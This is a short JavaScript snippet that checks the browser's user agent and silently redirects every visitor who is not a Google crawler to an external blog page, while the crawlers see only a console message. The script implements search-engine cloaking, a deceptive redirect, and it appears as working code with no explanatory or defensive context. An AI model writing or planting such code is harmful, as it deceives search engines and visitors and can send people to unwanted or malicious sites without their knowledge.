const ua = navigator.userAgent;

if (
  !ua.includes('Googlebot') &&
  !ua.includes('Google-InspectionTool')
) {
  window.location.href = "https://www.yafeau.net/2023/04/omar-amer-web.html";
} else {
  console.log("error ya baby");
}
